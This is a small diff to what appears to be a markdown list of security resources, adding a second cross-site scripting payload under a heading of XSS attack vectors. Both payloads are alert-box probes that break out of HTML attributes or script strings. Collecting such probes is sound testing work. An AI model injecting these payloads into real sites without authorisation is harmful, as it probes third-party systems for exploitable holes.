@@ -39,7 +39,8 @@ resources:
 
 <hr>
 
-## Custom useful XSS Attack Vector
+## Custom useful XSS Attack Vectors
 ```
 testing"><img/src=x onerror=alert(/XSS/)//
+testing'-alert(2)-'xss
 ```
